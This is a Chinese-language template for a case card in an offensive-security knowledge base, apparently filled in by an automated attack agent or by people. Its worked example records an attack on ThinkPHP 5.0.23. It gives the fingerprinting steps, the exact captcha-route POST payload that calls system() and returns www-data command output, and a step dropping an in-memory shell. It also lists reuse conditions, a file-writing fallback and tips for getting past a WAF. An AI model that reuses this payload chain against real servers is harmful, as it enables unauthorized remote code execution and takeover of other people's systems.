---
id: cases/_TEMPLATE
type: case
tags: [case, template]
source: self
license: MIT
version: 1
updated: 2026-10-22
dedupe_key: ""                    # 已作废字段：真实去重是 sha256 内容寻址，见 README §二
---

# 案例卡模板（复制成 `cases/<YYYYMMDD>-<短名>.md` 再填）

> **谁写**：ARTEX 任务收尾时自动生成（规则见 `kb/cases/README.md`），或人工/AI 事后补。
> **一条案例 = 一次真实打下来的经验**，不是教程。没有真实证据的不要写进 cases/。

## 元信息（frontmatter 必填）

```yaml
id: cases/20261022-thinkphp-captcha-rce
type: case
tags: [rce, thinkphp, captcha]        # 手法 + 技术 + 关键特征
source: self                          # self = 自己打出来的
license: MIT
version: 1
updated: 2026-10-22
dedupe_key: thinkphp-5.0.23|rce|GET /index.php?s=captcha|_method=__construct   # 旧字段，可留作人类可读标签
```

> ⚠️ **`dedupe_key` 不再是去重依据**（2026-10-23）：代码用 `sha256(Title/Target/VulnClass/ProofLevel/
> Confidence/Summary/Evidence/Negative/Tags)[:12]` 做文件名，同证据重复采集不会产生第二张卡。
> 上面的 `dedupe_key` 只当作"这条经验长什么样"的人类可读标签保留。详见 `kb/cases/README.md` §二。

## 目标画像

- 指纹：`ThinkPHP 5.0.23`（依据：`X-Powered-By` + 报错页版本）
- 暴露面：`GET /index.php?s=captcha`（未认证可达）
- 环境：PHP 7.2 / nginx / 无 WAF

## 成功路径（按实际发生顺序，别美化）

1. `GET /` → 报错页泄露版本 → 记 fact
2. 试 `?s=captcha` → 200 且回显空 → 确认路由存在
3. `POST /index.php?s=captcha` + `_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1` → 回显 phpinfo
4. 换 `filter[]=system` + `server[REQUEST_METHOD]=id` → 回显 `uid=33(www-data)`
5. 用 `system` 落地最小 shell（仅内存执行，未写文件）

## 关键 payload

```
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

## 失败过的尝试（同样重要）

| 尝试 | 结果 | 为什么失败 |
|---|---|---|
| `?s=index/\think\app/invokefunction` | 500 | 该版本路由未开 |
| 直接 `POST /` | 404 | 必须带 `s=` 才进路由 |

## 耗时与成本

- 首次成功耗时：6 min / 11 次工具调用
- 卡点：前 3 次都在试 `invokefunction` 链，换 `_method=__construct` 后一次成功

## 复用条件（下次什么情况下能直接套）

- 命中 `X-Powered-By: ThinkPHP` 且版本 ≤ 5.0.24 或 5.1.x
- `?s=` 路由可用
- 若无回显 → 改 `filter[]=file_put_contents` 写文件再访问（本次未用）

## 反例（什么情况下别套）

- ThinkPHP 6.x：`_method=__construct` 链不适用
- 有 WAF 且拦截 `filter[]`：先试参数污染与换编码，仍不行就换入口

## 关联

- 指纹表：`fingerprints/tech-vuln-map.md`
- 手法：`tactics/upload-to-rce.md`（落地阶段可复用）
